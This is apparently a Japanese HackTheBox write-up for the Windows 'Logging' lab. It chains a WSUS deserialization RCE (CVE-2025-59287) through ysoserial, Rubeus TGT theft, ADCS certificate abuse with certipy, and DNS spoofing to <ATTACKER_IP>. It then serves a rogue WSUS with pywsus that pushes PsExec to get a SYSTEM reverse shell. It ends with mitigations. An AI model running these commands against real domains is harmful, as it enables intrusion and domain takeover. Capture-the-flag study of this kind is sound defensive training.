🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# Logging: HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/4905cd7ce220aa3405c4bac3e62929c9.png" width="120"/>
<div>

**難易度** : Medium  
**OS** : Windows  
**種別** : Active Directory / WSUS / ADCS  

</div>
</div>

---

## 攻撃チェーンの概要

```
Nmap → ポート 8530 の WSUS (HTTP、認証なし)
→ CVE-2025-59287 : ReportingWebService における SoapFormatter デシリアライゼーション
→ ysoserial.NET ペイロード → DC01 上のサービスアカウントとして RCE
→ 認証情報 wallace.everette / Welcome2026@ → WinRM シェル
→ Rubeus tgtdeleg → jaylee.clifton として TGT 取得
→ certipy (ADCS UpdateSrv テンプレート) → NT ハッシュ + 新鮮な TGT
→ DNS スプーフィング wsus.logging.htb → 攻撃者マシン
→ pywsus HTTPS MITM (PR #18 + TLS 証明書)
→ PsExec64.exe 署名済みペイロード → SYSTEM → root.txt
```

---

**ヒント**: 攻撃中、[Koi](https://github.com/b3rt1ng/Koi) の `populate_win` モジュールを使って Rubeus や Certify のクリーンなバイナリを取得した。

## 列挙

### Nmap スキャン

```bash
nmap --privileged -sC -sV <TARGET_IP> -oN scan.txt
```

開放ポート :

| ポート | サービス | 詳細 |
|--------|---------|------|
| 53 | DNS | Simple DNS Plus |
| 80 | HTTP | Microsoft IIS 10.0 |
| 88 | Kerberos | Windows Kerberos |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Windows netbios-ssn |
| 389 / 636 | LDAP / LDAPS | Active Directory（`logging.htb`） |
| 445 | SMB | microsoft-ds |
| 3268 / 3269 | LDAP グローバルカタログ | Active Directory |
| **5985** | WinRM | Microsoft HTTPAPI 2.0 |
| **8530** | WSUS | Windows Server Update Services (HTTP) |

ターゲットは **ドメインコントローラー** (`DC01.logging.htb`)。SMB 署名は有効かつ必須。  
WSUS がポート **8530 の平文 HTTP**（TLS なし）で公開されており、これがすべての攻撃ベクターの根本原因となっている。

---

## 初期アクセス: CVE-2025-59287 (WSUS 経由の認証不要 RCE)

### 脆弱性

**CVE-2025-59287** は Microsoft の Windows Server Update Services (WSUS) における **認証不要のリモートコード実行** 脆弱性。`ReportingWebService.asmx` エンドポイントが `ReportEventBatch` SOAP リクエストの `SynchronizationUpdateErrorsKey` フィールドにある攻撃者制御データを `SoapFormatter` でデシリアライズする。

[ysoserial.NET](https://github.com/pwntester/ysoserial.net) のガジェットチェーン (`TextFormattingRunProperties` / `BinaryFormatter`) を注入することで、攻撃者は **認証なしで** WSUS サービスアカウントとしてコードを実行できる。

> 参考 : [shellcode.blog](https://shellcode.blog/wsus-cve-2025-59287-investigation/)、[code-white.com](https://code-white.com/blog/wsus-cve-2025-59287-analysis/)

### ステップ 1: ysoserial ペイロードの生成

Windows マシンまたは Wine 経由で base64 エンコードされたペイロードを生成する :

```powershell
# CVE-2025-59287: TextFormattingRunProperties ガジェット
.\ysoserial.exe -g TextFormattingRunProperties -f BinaryFormatter `
  -c "cmd /c <コマンド>" -o base64
```

### ステップ 2: PoC の実行

エクスプロイトは以下のフローを自動的に実行する :

1. **サーバー ID の取得**: `GET /ReportingWebService/ReportingWebService.asmx` (`GetRollupConfiguration`)
2. **認証クッキーの取得**: `POST /SimpleAuthWebService/SimpleAuth.asmx` (`GetAuthorizationCookie`)
3. **レポートクッキーの取得**: `POST /ClientWebService/Client.asmx` (`GetCookie`)
4. **デシリアライゼーションのトリガー**: `POST /ReportingWebService/ReportingWebService.asmx` (`ReportEventBatch`) にペイロードを `SynchronizationUpdateErrorsKey` へ格納

```bash
python3 PoC.py \
  --target-url http://<TARGET_IP>:8530 \
  --cve CVE-2025-59287 \
  --payload <BASE64_YSOSERIAL_BLOB> \
  --dns-name logging.htb \
  --random
```

期待される出力 :

```
[+] Getting Server ID...
[+] Server ID: <uuid>
[+] Auth cookie with Server ID...
[+] Using ID: <uuid>
[+] Sending event with payload...
[+] SUCCESS!
```

### ステップ 3: シェルの取得

RCE によりマシン上にハードコードされた認証情報が判明する。WinRM で接続する :

```bash
evil-winrm -i <TARGET_IP> -u 'wallace.everette' -p 'Welcome2026@'
```

`wallace.everette` としてシェルを取得。

---

## ユーザーフラグ

```powershell
type C:\Users\wallace.everette\Desktop\user.txt
```

```
HTB{************************}
```

---

## ポストエクスプロイト: Kerberos チケット委任

マシン上でサービスアカウントとして侵入した後、**Rubeus** を使って委任 TGT を盗み、ドメインユーザーとして横移動する。

### ステップ 1: Rubeus で委任 TGT を取得

[SharpCollection](https://github.com/Flangvik/SharpCollection) からプリコンパイル済みバイナリを取得する :

```powershell
Rubeus.exe tgtdeleg /nowrap
```

base64 エンコードされた `.kirbi` チケットが出力される。

### ステップ 2: チケットの変換

攻撃者マシン上で Kerberos チケットを Linux ツール向けの `.ccache` ファイルに変換する :

```bash
ticketConverter.py jaylee.clifton.kirbi jaylee.clifton.ccache
```

### ステップ 3: チケットのエクスポートと使用

```bash
export KRB5CCNAME=jaylee.clifton.ccache
```

パスワードなしで任意の Impacket ツールや certipy にこのチケットを使用できる。

### ステップ 4: (オプション) ADCS 経由で NT ハッシュを取得

```bash
# ドメインユーザーの TGT を使って証明書をリクエスト
certipy req \
  -target dc01.logging.htb \
  -dc-host dc01.logging.htb \
  -k -no-pass \
  -ca logging-DC01-CA

# PFX で認証して TGT + NT ハッシュを取得
certipy auth \
  -dc-ip <DC_IP> \
  -pfx jaylee.clifton.pfx
```

---

## 権限昇格: WSUS HTTPS MITM (pywsus)

root へのパスは、ドメインマシンが内部 WSUS サーバーから Windows Update を取得するという事実を悪用する。そのサーバーを偽装し、悪意ある (ただし Microsoft 署名済みの) 実行ファイルを配信することで、更新を確認するすべてのマシン（DC 自身を含む）で `SYSTEM` としてコードを実行できる。

### ステップ 1: `wsus.logging.htb` の DNS エントリを作成

`jaylee.clifton` の Kerberos チケットを使い、`wsus.logging.htb` を攻撃者 IP に向ける DNS A レコードを追加する :

```bash
python3 dnstool.py \
  -u 'logging.htb\jaylee.clifton' \
  -k \
  --action add \
  --record 'wsus.logging.htb' \
  --data '<ATTACKER_IP>' \
  <DC_IP>
```

ローカルの `/etc/hosts` にも追記する :

```
<ATTACKER_IP>  wsus.logging.htb
```

### ステップ 2: pywsus をクローンして HTTPS パッチを適用

ベースの [pywsus](https://github.com/GoSecure/pywsus) は HTTP のみをサポートする。TLS サポートを追加する [PR #18](https://github.com/GoSecure/pywsus/pull/18/files/43157a1d37d3d87cfac1057b48a4c36474a2271d) を適用する :

```bash
git clone https://github.com/GoSecure/pywsus
cd pywsus
# PR #18 の変更を手動で適用
# (--cert / --key 引数と ssl.wrap_socket を追加)
pip install -r requirements.txt
```

> [!NOTE]
> パッチ適用に手間取る場合は、[このツール](https://github.com/NeffIsBack/wsuks) がそのまま動作するはず。

### ステップ 3: ADCS 経由で `wsus.logging.htb` の証明書を取得

`UpdateSrv` テンプレートはカスタム SAN で証明書を登録できるため、WSUS サーバーの偽装に最適 :

```bash
# 証明書のリクエスト
certipy req \
  -u 'jaylee.clifton@logging.htb' \
  -k \
  -dc-ip <DC_IP> \
  -ca 'logging-DC01-CA' \
  -template 'UpdateSrv' \
  -upn 'wsus.logging.htb' \
  -dns 'wsus.logging.htb' \
  -target dc01.logging.htb

# 公開証明書の抽出
certipy cert -pfx wsus.logging.htb_wsus.pfx -nokey -out wsus.crt

# 秘密鍵の抽出
certipy cert -pfx wsus.logging.htb_wsus.pfx -nocert -out wsus.key
```

### ステップ 4: TLS 付きで pywsus を起動

ポート **8531** (WSUS HTTPS 標準ポート) で偽の WSUS サーバーを起動する。ペイロードは **Microsoft 署名済みバイナリ** である必要がある（Sysinternals の `PsExec64.exe` が最適）:

```bash
python3 pywsus.py \
  -H wsus.logging.htb \
  -p 8531 \
  -e PsExec64.exe \
  -c '-accepteula -s <コマンド>' \
  --cert wsus.crt \
  --key wsus.key
```

> `-s` はコマンドを `SYSTEM` として実行する。`<コマンド>` をリバースシェルや管理者ユーザー作成コマンドに置き換える。

### ステップ 5: クライアントの接続を待機

ドメインマシン (または DC 自身) が Windows Update を確認すると、偽の WSUS サーバーに接続し、署名済みの `PsExec64.exe` を受け取り、`SYSTEM` としてコマンドを実行する。

```bash
nc -lvnp 5555
# ... 待機 ...
# NT AUTHORITY\SYSTEM としてシェル取得
```

---

## root フラグ

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

```
HTB{************************}
```

---

## まとめ

| 発見事項 | 影響 |
|---------|------|
| HTTP (ポート 8530) で TLS なしの WSUS 公開 | CVE-2025-59287 と MITM 攻撃の両方を可能にする |
| CVE-2025-59287（SoapFormatter デシリアライゼーション） | DC 上でサービスアカウントとして認証不要 RCE |
| ハードコードされた認証情報 `wallace.everette` | さらなる攻撃なしで直接 WinRM アクセス |
| 無制約委任 + Rubeus tgtdeleg | `jaylee.clifton` への横移動用 TGT 窃取 |
| ADCS `UpdateSrv` テンプレートの誤設定 | `wsus.logging.htb` SAN の証明書登録を可能にする |
| HTTPS 経由の偽 WSUS (pywsus) | 更新を確認するドメインマシン上での SYSTEM 実行 |

**対策** : クライアント側で証明書ピン留めを強制しつつ WSUS を HTTPS で設定する。CVE-2025-59287 にパッチを適用する。危険な SAN 登録について ADCS テンプレートを監査する。DNS レコードの作成を特権アカウントに制限する。サービス設定に認証情報をハードコードしない。
